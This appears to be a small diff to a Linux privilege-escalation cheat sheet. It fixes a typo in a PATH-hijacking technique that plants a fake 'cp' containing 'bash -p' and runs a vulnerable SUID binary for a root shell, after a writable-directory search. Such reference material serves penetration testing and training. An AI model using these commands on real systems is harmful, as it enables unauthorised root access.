@@ -265,7 +265,7 @@ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 ```
 Make file identical to command, containing 'bash -p', chmoding, export PATH and then run vulnerable file
 ```bash
-lsdir badapple; echo 'bash -p' > badapple/cp
+mkdir badapple; echo 'bash -p' > badapple/cp
 chmod +x badapple/cp
 export PATH="/dev/shm/badapple/:$PATH"
 ./runvulnbin
